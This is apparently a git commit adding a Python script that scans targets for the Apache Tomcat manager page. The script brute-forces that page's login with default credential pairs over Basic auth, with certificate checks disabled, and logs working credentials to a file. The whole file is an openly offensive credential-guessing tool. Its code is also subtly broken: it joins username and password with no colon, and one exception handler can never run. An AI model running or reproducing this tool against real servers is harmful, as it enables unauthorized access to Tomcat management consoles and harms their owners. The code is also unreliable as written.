b1ba2e9685c16b2cb6e056406091b9e5226c34c5
oppsec <opps3c@gmail.com>
2024-02-04 17:38:25 -0300

    new: unified single.py and multiple.py

---
+++ src/core/bruteforce.py
@@ -0,0 +1,78 @@
+from requests import get
+from rich import print
+from base64 import b64encode
+
+from rich.console import Console
+console = Console()
+
+from urllib3 import disable_warnings
+disable_warnings()
+
+from src.core.manager import *
+
+def check_and_connect(target):
+    url: str = f"{target}/manager/html"
+
+    try:
+        response = get(url, **props)
+        body: str = response.text
+        status_code: str = response.status_code
+
+        if (status_code == 401 or status_code == 403 or status_code == 200):
+            if ('Tomcat' in body or 'tomcat' in body):
+                bruteforce(url)
+        else:
+            print(f"[red][-] Connection problems with {target} | {status_code} [/]")
+
+    except Exception as e:
+        print(f"[red][!] An error happened: {e} [/]")
+
+    except ConnectionRefusedError:
+        pass
+
+def connect(args) -> str:
+    """ Check if target is alive and try to connect with Apache Tomcat login page """
+
+    target = args.u
+    target_list = args.l
+
+    if target:
+        check_and_connect(target)
+    elif target_list:
+        with open(target_list, "r+") as file:
+            content = file.readlines()
+
+            for target in content:
+                if target:
+                    check_and_connect(target.rstrip())
+
+
+def bruteforce(url) -> str:
+    """ Bruteforce Apache Tomcat login with default credentials """
+
+    console.print(f"[green][+][/] Starting bruteforce on [bold white]{url}", highlight=False)
+    console.print(f"[green][+][/] {len(get_usernames())} usernames loaded. {len(get_passwords())} passwords loaded", highlight=False)
+
+    for u, p in zip(get_usernames(), get_passwords()):
+
+        auth_string: str = u+p
+        auth_string: str = auth_string.encode('utf-8')
+        auth_string: str = b64encode(auth_string)
+        auth_string: str = f'Basic {auth_string}'
+
+        chars: str = "b'"
+        auth_string: str = auth_string.replace(chars, "")
+        auth_string: str = auth_string.replace("'", "")
+
+        auth_header: str = { 'Authorization': auth_string, 'User-Agent': user_agent() }
+
+        response = get(url, verify=False, headers=auth_header)
+        status_code: str = response.status_code
+
+        if (status_code == 200):
+            print(f"[green][+][/] Credentials found: {u+p} | Cookie: {auth_string}\n")
+
+            with open("src/core/result/out.txt", "a+") as file:
+                file.write(f"{url} | {u+p} | {auth_string}")
+
+    console.print(f"[yellow][*][/] Bruteforce in {url} is done\n", highlight=False)
